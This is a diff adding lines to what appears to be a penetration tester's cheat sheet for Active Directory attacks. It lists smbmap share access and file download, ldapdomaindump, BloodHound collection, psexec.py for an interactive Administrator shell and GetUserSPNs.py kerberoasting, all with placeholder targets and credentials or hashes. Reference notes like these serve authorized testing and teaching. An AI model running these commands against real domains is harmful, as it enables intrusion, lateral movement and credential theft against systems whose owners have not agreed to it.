@@ -57,3 +57,15 @@ smbmap -H <target-ip-or-domain> -u <username> -p <password-or-hash> -d <fqdn> -R
 
 # smbmap download file
 smbmap -H <target-ip-or-domain> [-u <username> -p <password-or-hash> -d <fqdn>] --download '.\Path\To\File'
+
+# ldapdomaindump dump the domain ldap info human readable as html and json
+ldapdomaindump -u '<fqdn>\<username>' -p '<password-or-LM:NTLM-hash>' -o <outfolder> <dc-ip>
+
+# bloodhound-python BloodHound ingestor
+bloodhound-python -u '<username>' -p 'password' -dc <dc-hostname> -d <fqdn> -c ALL [--hashes 'LM:NLTM'] [-ns <name-server-ip-to-use>]
+
+# psexec interactive shell as Administrator
+psexec.py '<fqdn>/<username>:<password>@<target-ip-or-host>' -dc-ip <dc-ip>
+
+# GetUserSPNs.py get user accounts with mor than one service principal name (= kerberoastable) and request a TGS for them
+GetUserSPNs.py '<fqdn>/<user>:<password>' -dc-ip <dc-ip> [-request -outputfile <out-ile>]
